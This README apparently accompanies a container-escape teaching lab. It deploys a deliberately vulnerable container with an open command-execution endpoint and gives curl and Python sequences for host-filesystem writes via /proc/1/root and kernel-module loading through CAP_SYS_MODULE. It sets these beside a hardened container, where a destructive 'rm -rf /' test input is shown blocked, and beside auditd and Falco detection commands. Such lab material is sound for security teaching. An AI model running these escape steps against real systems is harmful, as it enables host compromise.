# Usage Examples

This file provides practical examples of how to use the container escape demonstration.

## 🚀 Quick Start

### 1. Deploy the Vulnerable Container

```bash
# Make deployment script executable
chmod +x deploy.sh

# Deploy the vulnerable container
./deploy.sh deploy
```

### 2. Access the Web Interface

Open your browser and navigate to: http://localhost:5000

### 3. Test RCE Vulnerability

Try executing commands through the web interface:
- `whoami` - Check current user
- `id` - Check user ID and groups
- `capsh --print` - Check capabilities
- `ls -la /` - List root directory
- `mount` - Show mounted filesystems

## 🔧 Command Line Examples

### Using curl to exploit RCE

```bash
# Basic command execution
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "whoami"}'

# Check container capabilities
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "capsh --print"}'

# List kernel modules
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "lsmod"}'

# Check mounted filesystems
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "mount | grep -E \"/proc|/sys|modules\""}'
```

### Container Escape Attempts

```bash
# Try to access host filesystem via /proc/1/root
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "ls -la /proc/1/root/"}'

# Attempt to write to host filesystem
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "echo \"Container Escaped: $(date)\" > /proc/1/root/tmp/escape_proof.txt"}'

# Check if escape was successful
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "cat /proc/1/root/tmp/escape_proof.txt"}'
```

### Kernel Module Loading Examples

```bash
# Create a simple test module
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "cd /tmp && cat > hello.c << \"EOF\"\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n\nMODULE_LICENSE(\"GPL\");\nMODULE_DESCRIPTION(\"Hello World Module\");\n\nstatic int __init hello_init(void) {\n    printk(KERN_INFO \"Hello from container!\\n\");\n    return 0;\n}\n\nstatic void __exit hello_exit(void) {\n    printk(KERN_INFO \"Goodbye from container!\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_exit);\nEOF"}'

# Create Makefile
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "cd /tmp && cat > Makefile << \"EOF\"\nobj-m += hello.o\n\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\nEOF"}'

# Compile the module
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "cd /tmp && make"}'

# Load the module (requires CAP_SYS_MODULE)
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "cd /tmp && insmod hello.ko"}'

# Check if module was loaded
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "lsmod | grep hello"}'

# Check kernel messages
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "dmesg | tail -5"}'
```

## 🐍 Using the Exploit Script

### Basic Usage

```bash
# Run the automated exploit
python3 exploit.py

# Run against specific target
python3 exploit.py http://localhost:5000
```

### Custom Python Exploitation

```python
#!/usr/bin/env python3
import requests
import json

# Target URL
url = "http://localhost:5000/api/rce"

def execute_command(cmd):
    """Execute command via RCE"""
    data = {"command": cmd}
    response = requests.post(url, json=data)
    if response.status_code == 200:
        result = response.json()
        print(f"Command: {cmd}")
        print(f"Output: {result['stdout']}")
        print(f"Errors: {result['stderr']}")
        print("-" * 50)
        return result
    else:
        print(f"Error: {response.status_code}")
        return None

# Example exploitation sequence
commands = [
    "whoami",
    "id",
    "capsh --print",
    "mount | grep -E 'proc|sys|modules'",
    "ls -la /lib/modules/",
    "lsmod | head -10"
]

for cmd in commands:
    execute_command(cmd)
```

## 🔒 Docker Commands

### Container Inspection

```bash
# Check container status
docker ps -a

# Inspect container configuration
docker inspect vulnerable-container

# Check container capabilities
docker exec vulnerable-container capsh --print

# View container logs
docker logs vulnerable-container

# Get shell access to container
docker exec -it vulnerable-container /bin/bash
```

### Security Analysis

```bash
# Check what capabilities are added
docker inspect vulnerable-container | grep -A 10 "CapAdd"

# Check mounted volumes
docker inspect vulnerable-container | grep -A 20 "Mounts"

# Check security options
docker inspect vulnerable-container | grep -A 10 "SecurityOpt"

# Check if running as privileged
docker inspect vulnerable-container | grep "Privileged"
```

## 🛡️ Secure Container Comparison

### Deploy Secure Version

```bash
# Deploy the secure container
docker-compose -f docker-compose.secure.yml up --build -d

# Test secure container (port 5001)
curl http://localhost:5001/health

# Try RCE on secure container (should fail)
curl -X POST http://localhost:5001/secure-execute \
     -H "Content-Type: application/json" \
     -d '{"command": "whoami"}'

# Try unauthorized command (should be blocked)
curl -X POST http://localhost:5001/secure-execute \
     -H "Content-Type: application/json" \
     -d '{"command": "rm -rf /"}'
```

### Security Comparison

```bash
# Compare capabilities
echo "=== Vulnerable Container ==="
docker exec vulnerable-container capsh --print

echo "=== Secure Container ==="
docker exec secure-container capsh --print

# Compare users
echo "=== Vulnerable Container User ==="
docker exec vulnerable-container whoami

echo "=== Secure Container User ==="
docker exec secure-container whoami

# Compare mounted filesystems
echo "=== Vulnerable Container Mounts ==="
docker exec vulnerable-container mount

echo "=== Secure Container Mounts ==="
docker exec secure-container mount
```

## 📊 Monitoring and Detection

### Host-based Detection

```bash
# Monitor for suspicious kernel module loading
sudo dmesg -w | grep -E "module|insmod|modprobe"

# Monitor for container escapes
sudo auditctl -w /proc/1/root -p wa -k container_escape
sudo tail -f /var/log/audit/audit.log | grep container_escape

# Monitor for capability usage
sudo sysctl kernel.dmesg_restrict=0
sudo dmesg | grep -E "capability|CAP_"
```

### Container Runtime Security

```bash
# Use Falco for runtime security monitoring (if installed)
sudo falco -r /etc/falco/falco_rules.yaml

# Monitor container behavior with docker stats
docker stats vulnerable-container

# Check for unusual network connections
sudo netstat -tulpn | grep :5000
```

## 🧪 Advanced Exploitation Techniques

### Host Process Manipulation

```bash
# Try to access host processes
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "ps aux | grep -E \"(kthreadd|init|systemd)\""}'

# Attempt to manipulate host processes
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "ls -la /proc/1/"}'
```

### Network-based Escape

```bash
# Check network configuration
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "ip addr show"}'

# Check routing table
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "ip route show"}'

# Attempt to access host network interfaces
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "cat /proc/net/dev"}'
```

## 🔧 Troubleshooting

### Common Issues and Solutions

```bash
# Issue: Module compilation fails
# Solution: Check kernel headers
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "ls -la /lib/modules/$(uname -r)/build"}'

# Issue: Permission denied for module loading
# Solution: Verify CAP_SYS_MODULE capability
curl -X POST http://localhost:5000/api/rce \
     -H "Content-Type: application/json" \
     -d '{"command": "capsh --print | grep sys_module"}'

# Issue: Cannot access host filesystem
# Solution: Check volume mounts
docker inspect vulnerable-container | grep -A 20 "Mounts"

# Issue: Container won't start
# Solution: Check logs
docker logs vulnerable-container
```

### Debugging Commands

```bash
# Check container environment
docker exec vulnerable-container env

# Check file permissions
docker exec vulnerable-container ls -la /app

# Check network connectivity
docker exec vulnerable-container ping -c 3 8.8.8.8

# Check disk usage
docker exec vulnerable-container df -h
```

## 📝 Educational Notes

### Key Learning Points

1. **CAP_SYS_MODULE Risk**: Demonstrates why this capability is dangerous
2. **Volume Mounts**: Shows how mounted volumes can enable escapes
3. **RCE Impact**: Illustrates the severity of command injection vulnerabilities
4. **Defense Strategies**: Compares vulnerable vs. secure configurations

### Security Principles Demonstrated

- **Principle of Least Privilege**: Secure container drops all capabilities
- **Defense in Depth**: Multiple security layers in secure configuration
- **Input Validation**: Secure app validates and whitelists commands
- **Resource Isolation**: Proper filesystem and network isolation

### Real-world Applications

- **Penetration Testing**: Understanding container escape techniques
- **Security Auditing**: Identifying dangerous container configurations
- **DevSecOps**: Implementing secure container practices
- **Incident Response**: Detecting and responding to container breaches